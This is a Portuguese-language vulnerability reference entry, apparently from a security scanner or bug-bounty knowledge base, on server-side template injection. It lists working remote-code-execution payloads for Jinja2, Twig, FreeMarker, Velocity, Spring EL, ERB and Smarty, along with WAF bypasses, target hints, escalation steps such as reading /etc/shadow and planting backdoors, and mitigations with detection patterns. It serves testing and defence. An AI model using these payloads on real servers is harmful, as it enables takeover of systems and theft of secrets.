---
id: ssti
title: "Server-Side Template Injection"
module: "ssti"
severity: "CRITICAL"
cwe_id: "CWE-94"
cwe_title: "Improper Control of Generation of Code ('Code Injection')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
vrt_id: "injection.remote_code_execution.server_side_template_injection"
---

## Summary
Entrada do usuário é concatenada em templates server-side, permitindo execução de expressões e, frequentemente, RCE no servidor. Afeta FreeMarker, Jinja2, Twig, Velocity, Thymeleaf, Smarty, ERB e outros.

## Description
Motores de template avaliam expressões no servidor. Se o usuário controla o template (e não apenas os dados), pode executar lógica arbitrária: ler variáveis de ambiente, arquivos, executar comandos e pivotar na rede. O erro clássico é `render("Olá " + nome)` em vez de `render("Olá {{ nome }}", {nome: nome})`.

A detecção usa expressões matemáticas específicas de cada engine. O resultado (`49` para `7*7`) confirma avaliação. A partir daí, o atacante escala para objetos internos, reflexão e execução de comandos.

Motores e payloads de detecção:
- Jinja2/Twig: `{{7*7}}`, `{{7*'7'}}`.
- FreeMarker: `${7*7}`, `<#assign x=7*7>${x}`.
- Velocity: `#set($x=7*7)$x`.
- Thymeleaf: `${7*7}`, `[[${7*7}]]`.
- ERB: `<%= 7*7 %>`.
- Smarty: `{7*7}`, `{math equation="7*7"}`.
- Spring EL: `${7*7}`, `#{7*7}`.
- Mako: `${7*7}`.
- Handlebars: `{{#with "s" as |string|}}...` (menos comum para RCE direto).

## Impact
- Execução remota de código no servidor (RCE).
- Leitura de arquivos, variáveis de ambiente e segredos.
- Movimento lateral, acesso a bancos e serviços internos.
- Modificação/destruição de dados e persistência.
- Comprometimento total do host/container; impacto CRITICAL.

## Payloads and Bypasses
```text
# Detecção
{{7*7}}
${7*7}
#{7*7}
%{7*7}
*{7*7}
@(7*7)
<%= 7*7 %>
{7*7}
{{7*'7'}}
${{7*7}}
[[${7*7}]]

# Jinja2 (Python)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id',0]|sort('system')}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>

# Velocity (Java)
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

# Thymeleaf / Spring EL (Java)
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","id"})}
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]

# ERB (Ruby)
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>

# Smarty (PHP)
{php}echo `id`;{/php}
{system('id')}
```

Bypasses de WAF/filtros:
```text
- Concatenação: {{'a'+'b'}}, ${"ja"+"va.lang.Runtime"}
- Codificação: %7B%7B7*7%7D%7D, \u007b\u007b7*7\u007d\u007d
- Comentários: {{7*7}}<!-- -->, {{7*7}}{#comment#}
- Alternar delimitadores: ${...}, #{...}, [[...]]
- Acesso via atributos/reflexão em vez de nomes bloqueados
- Usar `attr`, `request`, `config`, `self`, `cycler`, `lipsum` para alcançar objetos
- `__builtins__`, `__globals__`, `__subclasses__` com índices variáveis
- Payloads sem espaços usando `%09`, `%0a`, comentários
```

Casos reais e mentalidade de ataque (RWBH): Uber (templates de e-mail/notificação) e outros programas mostram que o bug aparece em previews, relatórios e mensagens; o atacante identifica o engine por `{{7*7}}`/`${7*7}` e escala para reflexão e RCE.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2019-3396 | Confluence Server | 2019 | SSTI via Widget Connector macro -- path traversal + RCE sem autenticacao | Velocity (RCE) |
| CVE-2019-11581 | Jira Server | 2019 | SSTI em ContactAdministrators e SendBulkMail -- RCE via template Velocity | Velocity (RCE) |
| CVE-2019-8341 | Jinja2 | 2019 | SSTI em from_string() quando source vem de input do usuario -- RCE em Python | Jinja2 (RCE) |
| CVE-2019-10074 | Apache OFBiz | 2019 | RCE via Freemarker markup em campo textarea de Form Widget | Freemarker (RCE) |
| CVE-2020-11994 | Apache Camel | 2020 | SSTI nos componentes de templating -- file disclosure e RCE | Multi-engine (RCE) |
| CVE-2020-1961 | Apache Syncope | 2020 | SSTI em mail templates -- injeccao de template em notificacoes | Multi-engine (RCE) |
| CVE-2021-39115 | Jira Service Management | 2021 | RCE via template injection para usuarios Jira Administrators | Velocity (RCE) |
| CVE-2022-22954 | VMware Workspace ONE | 2022 | RCE pre-auth via server-side template injection -- explorado in-the-wild | Server-side (RCE) |
| CVE-2023-22527 | Confluence Data Center | 2024 | Template injection pre-auth em versoes antigas -- RCE sem credenciais | OGNL (RCE) |

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `name`, `message`, `subject`, `template`, `preview`, `content`, `body`, `title`, `email`, `username`, `comment`, `description`, `lang`, `theme`.
- **Paths comuns:** `/preview`, `/render`, `/email/preview`, `/template`, `/report`, `/invoice`, `/notification`, `/admin/templates`, `/api/render`.
- **Sinais:** entrada refletida após avaliação; erros de template com stack trace; parâmetro `template`; funcionalidades de e-mail/report/PDF; expressões matemáticas avaliadas.

## Escalation Techniques
SSTI raramente se limita a avaliar expressoes matematicas -- o objetivo e escalar para execucao de comandos:

- **Execucao de comandos via sandbox escape:** em Jinja2, o atacante navega a hierarquia de classes Python (`[].__class__.__bases__[0].__subclasses__()`) para encontrar classes como `catch_warnings`, acessar `__builtins__` e importar `os` para executar `system()`. Cada engine tem sua cadeia de escape.
- **Leitura de arquivos sensiveis:** comandos como `cat /etc/shadow` permitem ler senhas criptografadas do sistema, que podem ser quebradas offline para obter acesso de admin.
- **Alteracao de configuracoes:** com RCE, o atacante pode modificar configuracoes do sistema, criar usuarios, instalar backdoors e garantir persistencia.
- **Escalacao de privilegios:** a partir da execucao de comandos, o atacante pode escalar privilegios no host e pivotar para outras maquinas na rede interna.
- **Identificacao do engine para payload correto:** a resposta a `{{7*'7'}}` diferencia Jinja2 (retorna `7777777`) de Twig (retorna `49`). Mensagens de erro frequentemente revelam o engine (ex: `jinja2.exceptions.UndefinedError`). O payload de escalacao depende inteiramente do engine e da linguagem.
- **Automacao com tplmap:** a ferramenta tplmap automatiza deteccao, identificacao do engine e construcao de exploits para os engines mais populares.
- **PoC nao destrutivo:** para demonstrar impacto sem causar dano, criar um arquivo com nome distinto no servidor (ex: `touch template_injection_by_NOME.txt`) em vez de executar comandos destrutivos.

Ao avaliar impacto, considere: qual engine e linguagem? O sandbox esta ativo? Existem gadgets conhecidos para essa versao? O processo roda com privilegios elevados?

## Hunting Methodology
Processo passo a passo para identificar SSTI:

1. **Identificar pontos de entrada:** mapear todos os locais que aceitam input do usuario -- URL paths, parametros, fragmentos, headers HTTP, body e uploads. Focar em funcionalidades que geram conteudo dinamico: e-mails, previews, relatorios, PDFs, paginas de perfil e notificacoes.
2. **Injetar payload de deteccao generico:** submeter a string `{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]` nos pontos de entrada. Esse payload e projetado para provocar erro em engines populares (Jinja2, Twig, FreeMarker, ERB). Um erro de aplicacao e forte indicador de template injection.
3. **Testar expressoes matematicas:** se erros sao suprimidos, submeter `${7*7}`, `{{7*7}}` e `<%= 7*7 %>`. Se alguma resposta contiver `49`, o input esta sendo avaliado como codigo.
4. **Verificar input embutido em expressao:** se o input ja e inserido dentro de tags de expressao (`{{...}}`), nao e necessario adicionar delimitadores extras -- submeter apenas `7*7` e verificar se `49` aparece na resposta.
5. **Determinar o engine:** usar a mensagem de erro (que frequentemente nomeia o engine), ou submeter payloads especificos -- `{{7*'7'}}` retorna `7777777` em Jinja2 e `49` em Twig; `${7*7}` funciona em FreeMarker e Thymeleaf; `<%= 7*7 %>` funciona em ERB.
6. **Verificar reflexao atrasada:** alguns inputs so sao renderizados em outro contexto (e-mail futuro, relatorio gerado, pagina de admin). Monitorar esses canais apos submissao do payload.
7. **Escalar para RCE:** com o engine identificado, pesquisar gadgets e cadeias de sandbox escape. Construir payload de execucao de comando especifico para o engine/linguagem.

## False Positive Indicators
Sinais de que a deteccao pelo scanner **nao e SSTI exploravel**:

- **Expressao avaliada no client-side:** frameworks JavaScript como Angular e Vue usam `{{...}}` para template binding no frontend. Isso e client-side template injection (CSTI), nao SSTI -- o impacto e diferente e geralmente menor.
- **Reflexao sem avaliacao:** se `{{7*7}}` aparece literalmente na resposta como `{{7*7}}` em vez de `49`, o input nao esta sendo interpretado pelo engine. O scanner pode confundir reflexao com avaliacao.
- **Engine com sandbox robusto:** mesmo que a expressao matematica seja avaliada, engines com sandbox ativo podem bloquear acesso a classes, metodos e modulos perigosos. O 7*7 funciona, mas escalar para RCE pode ser impossivel.
- **Erro generico nao relacionado:** um erro 500 apos injetar payload pode ser causado por input malformado, nao por processamento de template. Verificar se a mensagem de erro referencia o engine ou se e um erro generico de validacao.
- **Input sanitizado antes do template:** se o input passa por HTML encoding antes de ser inserido no template, os caracteres especiais (`{`, `}`, `$`, `%`) podem ser neutralizados.
- **Avaliacao matematica fora de template:** algumas aplicacoes avaliam expressoes matematicas por design (ex: calculadoras, campos de formula). Isso nao e template injection.

## Recommendation
1. Nunca concatenar entrada do usuário no template. Passar dados como variáveis e usar autoescape.
2. Preferir templates logic-less (Mustache) quando possível; evitar engines que permitem chamadas de método/reflexão.
3. Ativar sandbox do engine (Jinja2 `SandboxedEnvironment`, FreeMarker `TemplateClassResolver.SAFER_RESOLVER`, Velocity `SecureUberspector`).
4. Restringir classes/métodos acessíveis e desabilitar `Runtime`, `ProcessBuilder`, reflexão e carregamento de classes.
5. Validar e limitar entrada; não permitir que usuários editem templates sem privilégio administrativo.
6. Executar renderização em processo/container isolado, sem acesso à rede/filesystem, com seccomp/AppArmor.
7. Atualizar engines e bibliotecas; muitas cadeias dependem de gadgets conhecidos.
8. Exemplo Jinja2 seguro:
```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment(autoescape=True)
template = env.from_string("Olá {{ nome }}")
return template.render(nome=user_input)
```
9. Monitorar payloads com `{{`, `${`, `<#`, `#set`, `T(`, `Runtime`, `__class__`, `__globals__`.
